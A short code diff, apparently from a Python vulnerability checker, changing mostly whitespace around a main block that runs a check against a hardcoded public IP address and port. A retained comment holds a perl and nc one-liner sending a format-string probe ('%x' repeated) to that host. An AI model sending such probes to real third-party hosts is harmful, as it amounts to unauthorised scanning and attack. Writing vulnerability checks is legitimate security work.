@@ -69,11 +69,13 @@ def check(ip, port, timeout):
             return u"漏洞"
     except:
         pass
-# perl -e 'print"GET /";print"%x"x20;print" HTTP/1.0\r\n\r\n\r\n"' | nc 39.103.217.161 8888 
+
+
+# perl -e 'print"GET /";print"%x"x20;print" HTTP/1.0\r\n\r\n\r\n"' | nc 39.103.217.161 8888
 if __name__ == "__main__":
     print(" >>> m1 running ... ")
     # m1.script_main()
-    
+
     check('39.103.217.161', 8888, 100)
-    
+
     sys.exit(0)
